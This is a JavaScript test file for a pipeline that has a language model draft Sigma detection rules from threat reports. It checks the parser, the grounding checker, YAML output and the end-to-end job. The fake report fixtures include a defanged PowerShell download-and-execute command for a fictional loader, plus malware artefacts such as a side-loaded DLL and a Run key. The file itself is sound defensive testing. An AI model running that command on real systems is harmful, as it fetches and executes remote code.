// Offline test of the Sigma drafts (neon/parts/37o-sigma.mjs): the condition parser and evaluator, value grounding, the
// rule checker's failures, the YAML writer (parsed back by pySigma when it is installed), and the job end to end on
// real Postgres (PGlite) with a fake model and fake publisher pages: candidate choice, one repair round, the stored
// attempt, the cooldown and the published document.
// node test/sigma_test.mjs <repository root>   (after python3 pipeline/collector_build.py .)
import { PGlite } from '@electric-sql/pglite';
import { pg_trgm } from '@electric-sql/pglite/contrib/pg_trgm';
import zlib from 'node:zlib';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';

const ROOT = path.resolve(process.argv[2] || '.');
let pass = 0;
const ok = (c, m) => { assert.ok(c, m); pass++; };

const db = await PGlite.create({ extensions: { pg_trgm } });
await db.exec(fs.readFileSync(path.join(ROOT, 'neon', 'schema.sql'), 'utf8'));
const RAW = Object.fromEntries(Array.from({ length: 6000 }, (_, i) => [i, (v) => v]));
const runSql = async (q, params) => { const r = await db.query(q, params, { rowMode: 'array', parsers: RAW }); return { fields: r.fields, rows: r.rows }; };
process.env.DATABASE_URL = 'postgresql://ti_app:pw@ep-test-pooler.c-14.us-east-1.aws.neon.tech/threatintel?sslmode=require';
process.env.AWS_ENDPOINT_URL_S3 = 'https://br-test.storage.c-14.us-east-1.aws.neon.tech';
process.env.AWS_ACCESS_KEY_ID = 'nak_test'; process.env.AWS_SECRET_ACCESS_KEY = 'nsk_test';
const bucket = new Map();
const TECH = [['T1059', 'Command and Scripting Interpreter', 'Execution', 40], ['T1059.001', 'PowerShell', 'Execution', 120], ['T1547.001', 'Registry Run Keys / Startup Folder', 'Persistence, Privilege Escalation', 60],
  ['T1105', 'Ingress Tool Transfer', 'Command and Control', 80], ['T1574.002', 'DLL Side-Loading', 'Persistence, Privilege Escalation, Stealth', 0], ['T1190', 'Exploit Public-Facing Application', 'Initial Access', 30],
  ...Array.from({ length: 320 }, (_, i) => [`T9${String(i).padStart(3, '0')}`, 'filler', 'Discovery', 1])].map(([technique_id, name, tactics, sigma]) => ({ technique_id, name, tactics, sigma }));
const PAGE1 = `<html><title>GhostLoader analysis</title><article><p>GhostLoader is delivered as an MSI. On execution the installer drops C:\\Users\\Public\\Libraries\\ghostsvc.dll and side-loads it through
  a renamed binary, C:\\Users\\Public\\Libraries\\update_helper.exe. Persistence is a Run key value named GhostUpdate under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.</p>
  <p>The loader contacts cdn-sync[.]example[.]net over HTTPS with the user agent Mozilla/5.0 (GhostLoader/2.1).</p>${'<p>Filler paragraph about the campaign and its victims.</p>'.repeat(20)}</article></html>`;
const PAGE2 = `<html><article><p>Researchers tracking GhostLoader saw PowerShell run with the arguments -nop -w hidden -c iex(iwr hxxps://cdn-sync[.]example[.]net/s.ps1) from the side-loaded helper.</p>${'<p>More text.</p>'.repeat(40)}</article></html>`;
const resp = (status, body) => new Response(typeof body === 'string' || Buffer.isBuffer(body) ? body : JSON.stringify(body), { status });
globalThis.fetch = async (url, opts = {}) => {
  const u = String(url);
  if (u === 'https://api.c-14.us-east-1.aws.neon.tech/sql') {
    const body = JSON.parse(opts.body);
    try {
      if (body.queries) { await db.exec('BEGIN'); try { const results = []; for (const q of body.queries) results.push(await runSql(q.query, q.params)); await db.exec('COMMIT'); return resp(200, { results }); } catch (e) { await db.exec('ROLLBACK'); throw e; } }
      return resp(200, await runSql(body.query, body.params));
    } catch (e) { return resp(400, { message: e.message }); }
  }
  if (u.startsWith(process.env.AWS_ENDPOINT_URL_S3 + '/')) {
    const key = decodeURIComponent(new URL(u).pathname.slice(1));
    if (opts.method === 'PUT') { bucket.set(key, Buffer.from(opts.body)); return resp(200, ''); }
    return bucket.has(key) ? resp(200, bucket.get(key)) : resp(404, 'NoSuchKey');
  }
  if (u === 'https://intel.kilfoycyber.com/data/defense_techniques.json') return resp(200, TECH);
  if (u === 'https://research.one/ghostloader') return resp(200, PAGE1);
  if (u === 'https://research.two/ghost') return resp(200, PAGE2);
  if (u === 'https://news.three/ghost') return resp(200, '<html><article>' + 'An unrelated page about something else entirely. '.repeat(30) + '</article></html>');
  if (u.startsWith('https://research.four/')) return resp(404, 'gone');
  throw new Error('unexpected network request ' + u);
};
const M = await import(path.join(ROOT, 'neon', 'collector.mjs'));

// ---------------------------------------------------------------- condition
{
  const names = ['selection_img', 'selection_cli', 'filter_main'];
  const a = M.parseCondition('selection_img and selection_cli and not filter_main');
  ok(M.condEval(a, { selection_img: true, selection_cli: true }, names) && !M.condEval(a, { selection_img: true, selection_cli: true, filter_main: true }, names) && !M.condEval(a, {}, names), 'and, not');
  const b = M.parseCondition('1 of selection_* and not 1 of filter_*');
  ok(M.condEval(b, { selection_cli: true }, names) && !M.condEval(b, {}, names) && [...M.condNames(b, names)].sort().join() === 'filter_main,selection_cli,selection_img', '1 of pattern');
  ok(M.condEval(M.parseCondition('all of them'), { selection_img: true, selection_cli: true, filter_main: true }, names) && !M.condEval(M.parseCondition('all of them'), { selection_img: true }, names), 'all of them');
  ok(M.condEval(M.parseCondition('not filter_main'), {}, names), 'a purely negative condition is true on nothing (the checker rejects it)');
  for (const bad of ['selection and', '(selection_img', 'selection_img or or x', '1 of', '', 'selection_img | count() > 5']) assert.throws(() => M.parseCondition(bad)), pass++;
}
// ---------------------------------------------------------------- grounding
{
  const t = M.groundText(PAGE1.replace(/<[^>]+>/g, ' '));
  ok(t.includes('cdn-sync.example.net') && M.grounded('cdn-sync.example.net', t), 'refanged domains are found');
  ok(M.grounded('\\Users\\Public\\Libraries\\ghostsvc.dll', t) && M.grounded('*\\ghostsvc.dll', t) && M.grounded('C:\\Users\\Public\\Libraries\\*.exe', t), 'paths by wildcard fragment');
  ok(!M.grounded('\\ghostsvc64.dll', t) && !M.grounded('evil.example.org', t) && !M.grounded('ab', t), 'an absent or too-short value is not grounded');
  const t2 = M.groundText('powershell /nop /w hidden');
  ok(M.grounded('-nop', t2, true) && !M.grounded('-nop', t2, false), 'windash accepts the slash form');
}
// ---------------------------------------------------------------- the checker
const techniques = new Set(TECH.map((t) => t.technique_id)), tactics = new Set(['execution', 'persistence', 'privilege-escalation', 'command-and-control', 'stealth', 'initial-access']);
const ctx = { text: M.groundText(M.pageText(PAGE1) + '\n' + M.pageText(PAGE2)), sources: 2, techniques, tactics };
const good = {
  title: 'GhostLoader DLL Side-Loading From Public Libraries Folder', description: 'Detects the GhostLoader helper binary loading its side-loaded DLL from the Public Libraries folder.',
  logsource: { category: 'image_load', product: 'windows' },
  detection: { selection: { 'Image|endswith': '\\update_helper.exe', 'ImageLoaded|endswith': '\\Libraries\\ghostsvc.dll' }, filter_main: { 'ImageLoaded|startswith': 'C:\\Windows\\System32\\' }, condition: 'selection and not filter_main' },
  falsepositives: ['Unknown'], level: 'high', tags: ['attack.persistence', 'attack.t1574.002', 'attack.bogus'], evidence: [1],
};
{
  const c = M.checkRule(good, ctx);
  ok(c.ok && c.rule.tags.join() === 'attack.persistence,attack.t1574.002' && c.warnings.length === 1, 'a grounded image_load rule passes; an unknown tag is dropped ' + JSON.stringify(c.failures));
  const variants = [
    [{ logsource: { category: 'process_creation', product: 'windows' } }, /field ImageLoaded is not a process_creation field/],
    [{ logsource: { category: 'sysmon_magic', product: 'windows' } }, /not in the Sigma taxonomy/],
    [{ logsource: { category: 'webserver', product: 'windows' } }, /takes product \(none\)/],
    [{ detection: { selection: { 'Image|endswith': '\\update_helper.exe', 'ImageLoaded|re': 'ghost.*' }, condition: 'selection' } }, /modifier re/],
    [{ detection: { selection: { 'Image|endswith': '\\update_helper.exe' }, condition: 'selection and other' } }, /undefined selections: other/],
    [{ detection: { selection: { 'Image|endswith': '\\update_helper.exe' }, unused: { 'ImageLoaded|endswith': '\\ghostsvc.dll' }, condition: 'selection' } }, /not used by the condition: unused/],
    [{ detection: { filter: { 'ImageLoaded|endswith': '\\ghostsvc.dll' }, condition: 'not filter' } }, /true when no selection matches/],
    [{ detection: { selection: { 'ImageLoaded|endswith': '\\ghostsvc64.dll' }, condition: 'selection' } }, /values not found in the sources: ImageLoaded="\\\\ghostsvc64.dll"/],
    [{ detection: { selection: { 'Image|endswith': '\\rundll32.exe' }, condition: 'selection' } }, /no grounded value specific/],
    [{ detection: { selection: ['ghostsvc.dll'], condition: 'selection' } }, /keyword lists are not accepted/],
    [{ tags: ['attack.t1574.099'] }, /T1574\.099 does not exist/],
    [{ tags: ['attack.persistence'] }, /at least one ATT&CK technique/],
    [{ level: 'critical' }, /level must be low, medium or high/],
    [{ evidence: [3] }, /evidence must list the source numbers \(1 to 2\)/],
    [{ title: 'short' }, /title must be/],
  ];
  for (const [patch, re] of variants) {
    const c2 = M.checkRule({ ...good, ...patch }, ctx);
    ok(!c2.ok && c2.failures.some((f) => re.test(f)), `rejected: ${re} ${JSON.stringify(c2.failures)}`);
  }
  const svc = M.checkRule({ ...good, logsource: { product: 'windows', service: 'security' }, detection: { selection: { EventID: '4657', ObjectName: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', ObjectValueName: 'GhostUpdate' }, condition: 'selection' } }, ctx);
  ok(!svc.ok && svc.failures.some((f) => /field ObjectValueName is not a/.test(f)) && !svc.failures.some((f) => /values not found.*EventID/.test(f)), 'service log sources check fields; event ids are exempt from grounding ' + JSON.stringify(svc.failures));
}
// ---------------------------------------------------------------- YAML, and pySigma when it is installed
const yamls = [];
{
  const c = M.checkRule(good, ctx);
  const id = M.sigmaId('malware:x', c.rule);
  ok(/^[0-9a-f]{8}-[0-9a-f]{4}-5[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/.test(id) && id === M.sigmaId('malware:x', c.rule) && id !== M.sigmaId('malware:y', c.rule), 'a deterministic UUID-shaped id');
  const y = M.toYaml(c.rule, { id, references: ['https://research.one/ghostloader'], date: '2026-11-19', author: "KTI draft by test/model:free from public reporting, unreviewed" });
  ok(y.includes("status: experimental") && y.includes("    selection:\n        Image|endswith: '\\update_helper.exe'") && y.includes('    condition: selection and not filter_main') && y.includes("level: high"), 'YAML layout');
  yamls.push(y);
  const list = M.checkRule({ ...good, detection: { selection: [{ 'Image|endswith': '\\update_helper.exe', 'ImageLoaded|endswith': ['\\ghostsvc.dll', '\\Libraries\\ghostsvc.dll'] }, { 'ImageLoaded|contains|all': ['\\Users\\Public\\Libraries\\', 'ghostsvc'] }], condition: 'selection' } }, ctx);
  ok(list.ok, 'a list of field maps with an all modifier passes ' + JSON.stringify(list.failures));
  yamls.push(M.toYaml(list.rule, { id: M.sigmaId('s', list.rule), references: ['https://a/it\'s'], date: '2026-11-19', author: "it's a draft" }));
}
const py = process.env.PYTHON || 'python3';
const hasPySigma = spawnSync(py, ['-c', 'import sigma.rule'], { encoding: 'utf8' }).status === 0;

// ---------------------------------------------------------------- the job end to end
const day = (d) => new Date(Date.now() - d * 864e5).toISOString();
await db.query(`INSERT INTO ti.entity (id, t, n, names, m) VALUES ('malware:mp:ghost', 'malware', 'GhostLoader', 'GhostLoader | GHOSTLDR', '{}'), ('actor:G9999', 'actor', 'Quiet Group', 'Quiet Group', '{}')`);
const E = [['https://research.one/ghostloader', 'GhostLoader analysis', 'research.one', 'research', 1, 'malware:mp:ghost'], ['https://research.two/ghost', 'GhostLoader spreads', 'research.two', 'research', 2, 'malware:mp:ghost'],
  ['https://news.three/ghost', 'Loader news', 'news.three', 'cyber-news', 1, 'malware:mp:ghost'], ['https://research.four/ghost', 'GhostLoader again', 'research.four', 'research', 3, 'malware:mp:ghost'],
  ['https://n/1', 'Quiet Group', 'n1', 'cyber-news', 1, 'actor:G9999'], ['https://n/2', 'Quiet Group', 'n2', 'cyber-news', 1, 'actor:G9999'], ['https://n/3', 'Quiet Group', 'n3', 'cyber-news', 1, 'actor:G9999']];
for (const [link, title, host, cat, d, eid] of E) {
  await db.query(`INSERT INTO ti.item (link, fp, feed, source, host, title, summary, published, category, seen_at) VALUES ($1, $1, 'f', 's', $2, $3, '', $4, $5, $4)`, [link, host, title, day(d), cat]);
  await db.query(`INSERT INTO ti.mention (eid, link, published, host, via) VALUES ($1, $2, $3, $4, 'item')`, [eid, link, day(d), host]);
}
const cands = await M.sigmaCandidates();
ok(cands.length === 1 && cands[0].eid === 'malware:mp:ghost' && cands[0].p === 4 && cands[0].research === 3, 'a candidate needs three publishers and a research entry ' + JSON.stringify(cands));
// The model: the first answer has one good rule and one with an invented value; the repair drops the bad value.
const bad = { ...good, title: 'GhostLoader Run Key Persistence Value', description: 'Detects the GhostLoader Run key value written for persistence.', logsource: { category: 'registry_set', product: 'windows' },
  detection: { selection: { 'TargetObject|endswith': '\\CurrentVersion\\Run\\GhostUpdate', 'Details|contains': 'ghostsvc64.exe' }, condition: 'selection' }, tags: ['attack.persistence', 'attack.t1547.001'], level: 'medium', evidence: [1] };
const fixed = { ...bad, detection: { selection: { 'TargetObject|endswith': '\\CurrentVersion\\Run\\GhostUpdate' }, condition: 'selection' } };
const net = { title: 'GhostLoader Proxy Request With Its User Agent', description: 'Detects web proxy requests carrying the GhostLoader user agent to its delivery host.', logsource: { category: 'proxy' },
  detection: { selection: { 'c-useragent': 'Mozilla/5.0 (GhostLoader/2.1)', 'cs-host': 'cdn-sync.example.net' }, condition: 'selection' }, falsepositives: ['Unknown'], level: 'high', tags: ['attack.command-and-control', 'attack.t1105'], evidence: [1, 2] };
const seen = [];
let turn = 0;
const chat = async (model, messages) => {
  seen.push({ model, messages: messages.map((m) => m.role + ':' + m.content.slice(0, 200)) });
  turn++;
  if (model === 'broken/model:free') return { ok: true, msg: { content: 'I cannot answer in JSON, sorry.' } };
  const body = turn <= 2 ? { rules: [good, bad, net] } : { rules: [good, fixed, net] };
  return { ok: true, msg: { content: '```json\n' + JSON.stringify(body) + '\n```' }, usage: { prompt_tokens: 9000, completion_tokens: 800 } };
};
process.env.OPENROUTER_API_KEY = 'test-key';
const r1 = await M.runJob('sigma', { chat, models: ['broken/model:free', 'test/model:free'] });
const doc = JSON.parse(zlib.gunzipSync(bucket.get('ti-docs/docs/sigma.json.gz')).toString());
const att = (await db.query(`SELECT * FROM ti.sigma`)).rows;
ok(r1.ok && att.length === 1 && att[0].outcome === 'draft' && att[0].model === 'test/model:free', 'one attempt stored as a draft by the model that answered ' + JSON.stringify(r1).slice(0, 400));
ok(att[0].calls.length === 3 && att[0].calls[0].error.startsWith('unreadable answer') && att[0].calls[0].model === 'broken/model:free', 'an unreadable answer passes the subject to the next model; the repair is a third call');
ok(seen[2].messages.some((m) => /checker rejected some rules/.test(m) && /ghostsvc64\.exe/.test(m)), 'the repair round names the ungrounded value');
const src = att[0].sources;
ok(src.length === 2 && src.every((s) => /research\.(one|two)/.test(s.url)) && !src.some((s) => 'text' in s), 'pages that do not name the subject or do not load are skipped; page text is not stored');
const rules = doc.rows.filter((r) => r.kind === 'rule');
ok(doc.drafts === 3 && doc.rejected === 0 && rules.every((r) => r.ok && r.yaml && r.references.length), 'three accepted drafts with YAML and references ' + JSON.stringify(rules.map((r) => [r.title, r.failures])));
const sl = rules.find((r) => r.techniques.includes('T1574.002'));
ok(sl && sl.gap === true && sl.public_sigma['T1574.002'] === 0 && rules.find((r) => r.techniques.includes('T1105')).gap === false, 'a technique with no public Sigma rule is marked as a gap');
ok(sl.yaml.includes('    - detection.emerging-threats') && /author: 'KTI draft by test\/model:free from public reporting, unreviewed/.test(sl.yaml) && sl.yaml.includes("    - 'https://research.one/ghostloader'"), 'author line, references and the emerging-threats tag');
for (const r of rules) yamls.push(r.yaml);
const r2 = await M.runJob('sigma', { chat, models: ['test/model:free'] });
ok(r2.ok && r2.skipped === 'no subject is due' && (await db.query(`SELECT count(*)::int AS n FROM ti.sigma`)).rows[0].n === 1, 'the cooldown keeps a drafted subject out ' + JSON.stringify(r2));
// A model that finds nothing concrete: outcome none; a subject whose pages cannot be read: no_source, retried sooner.
await db.query(`UPDATE ti.sigma SET created_at = now() - interval '30 days'`);
const r3 = await M.runJob('sigma', { chat: async () => ({ ok: true, msg: { content: '{"rules": [], "reason": "the reporting names no artefacts"}' } }), models: ['m:free'] });
ok(r3.attempt.outcome === 'none' && r3.attempt.reason === 'the reporting names no artefacts', 'no artefacts: outcome none, with the model\'s reason');
await db.query(`UPDATE ti.sigma SET created_at = now() - interval '30 days'`);
await db.query(`UPDATE ti.item SET category = 'research' WHERE link LIKE 'https://n/%'`);
await db.query(`DELETE FROM ti.mention WHERE eid = 'malware:mp:ghost'`);
const r4 = await M.runJob('sigma', { chat, models: ['m:free'] });
ok(r4.attempt.subject === 'actor:G9999' && r4.attempt.outcome === 'no_source' && (await db.query(`SELECT count(*)::int AS n FROM ti.sigma WHERE outcome = 'no_source'`)).rows[0].n === 1, 'a subject whose pages fail to load or do not name it is recorded as no_source ' + JSON.stringify(r4.attempt));
// Rejected rules keep their reasons and no YAML.
await db.query(`DELETE FROM ti.sigma`);
await db.query(`INSERT INTO ti.mention (eid, link, published, host, via) VALUES ('malware:mp:ghost', 'https://research.one/ghostloader', $1, 'research.one', 'item'), ('malware:mp:ghost', 'https://research.two/ghost', $1, 'research.two', 'item'), ('malware:mp:ghost', 'https://news.three/ghost', $1, 'news.three', 'item')`, [day(1)]);
await db.query(`DELETE FROM ti.mention WHERE eid = 'actor:G9999'`);
const r5 = await M.runJob('sigma', { chat: async () => ({ ok: true, msg: { content: JSON.stringify({ rules: [bad] }) } }), models: ['m:free'] });
const d5 = JSON.parse(zlib.gunzipSync(bucket.get('ti-docs/docs/sigma.json.gz')).toString());
const rr = d5.rows.find((r) => r.kind === 'rule');
ok(r5.attempt.outcome === 'rejected' && rr && !rr.ok && rr.yaml === null && rr.failures.some((f) => /ghostsvc64/.test(f)), 'a rule still failing after the repair is kept as rejected with its reasons');
ok(M.plan(new Date('2026-11-19T10:34:00Z')).join() === 'gdelt,infra,snap,sources,entities,watch,sigma,reports' && !M.plan(new Date('2026-11-19T10:04:00Z')).includes('sigma'), 'sigma runs in the :30 quarter hour');

if (hasPySigma) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'sigma-'));
  yamls.forEach((y, i) => fs.writeFileSync(path.join(dir, `r${i}.yml`), y));
  const v = spawnSync(py, ['-I', '-c', `
import sys, glob
from sigma.rule import SigmaRule
from sigma.validators.core import validators
from sigma.validation import SigmaValidator
from sigma.collection import SigmaCollection
paths = sorted(glob.glob(sys.argv[1] + '/*.yml'))
coll = SigmaCollection([SigmaRule.from_yaml(open(p).read(), collect_errors=False) for p in paths])
# attacktag and d3_fendtag download ATT&CK and D3FEND (the collector checks techniques against ATT&CK v20 itself); the
# draft ids repeat on purpose across this fixture's runs.
keep = {k: v for k, v in validators.items() if k not in ('identifier_uniqueness', 'attacktag', 'd3_fendtag', 'duplicate_title', 'duplicate_filename')}
issues = SigmaValidator(keep.values()).validate_rules(coll)
for i in issues: print('ISSUE', type(i).__name__, i)
print('RULES', len(coll))
`, dir], { encoding: 'utf8' });
  ok(v.status === 0 && new RegExp(`RULES ${yamls.length}`).test(v.stdout), 'pySigma parses every draft ' + v.stdout + v.stderr);
  ok(!/ISSUE/.test(v.stdout), 'pySigma\'s core validators raise nothing ' + v.stdout);
} else console.log('sigma_test: pySigma not installed, YAML parse check skipped');
console.log(`sigma_test: ${pass} checks passed`);
